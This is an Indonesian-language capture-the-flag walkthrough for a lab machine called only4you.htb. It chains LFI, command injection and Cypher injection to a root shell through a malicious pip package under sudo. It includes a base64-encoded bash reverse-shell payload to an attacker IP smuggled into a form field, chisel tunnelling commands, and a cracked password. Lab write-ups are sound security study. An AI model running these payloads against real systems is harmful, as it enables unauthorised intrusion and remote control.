## Solver
Add onlyforyou.htb ke host
lakukan curl -iL onlyforyou.htb didapatkan redirect location ke only4you.htb
lakukan subdomain enumeration, didapatkan subdomain beta.only4you.htb
Akses website beta, terdapat fitur download source code.
Lakukan review source code, didapatkan endpoint /download vulnerable dengan LFI
Lakukan read file /etc/nginx/sites-available/default, didapatkan lokasi web root domain dan subdomain beta
Read app.py dari main domain only4you.htb didapatkan process email dengan import form.py
Read form.py ternyata melakukan command execution process, vulnerable dengan RCE
Kirim POST name=banua&email=banua@email.com|echo+'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQwLzEyMzQgMD4mMQo='|base64+-d|bash&subject=Pentest&message=Pentest ke / pada domain only4you.htb
#L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQwLzQ0NDQgMD4mMQo= 4444

Dapat reverse shell
Check netstat -tulpn didapatkan port active seperti 3000, 8001 dan lainnya.
coba curl port 8001 ternyata jalan service web
port forwarding dengan chisel untuk akses di local machine

Download chisel versi 1.5.2 karena victim memakai libc versi lama

./chisel client 10.10.16.40:5555 R:8001:127.0.0.1:8001 <= Pada victim
./chisel server -p 5555 --reverse <= Pada mesin attacker

login dengan default credentials admin:admin

search is vulnerable to Cypher Injection
use cyphermap to dump properties and key values

./cyphermap.py -u "http://127.0.0.1:8001/search" -d "search=a*" -c "session=df672086-a714-43a0-a44f-c4663f3ffde4;"  -s Sarah -P user -K password,username

didapatkan password hash
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You

Login user john dengan password ThisIs4You

Vertical Privesc

sudo -l

Create exploit malicious python package, output exploit akan jadi \*.tar.gz

Port Forwarding port 3000

Login user john

Change test repository from private to public

Upload \*tar.gz

sudo /usr/bin/pip3 download link raw file \*.tar.gz dalam repository test tersebut

/bin/bash -p and pwned!



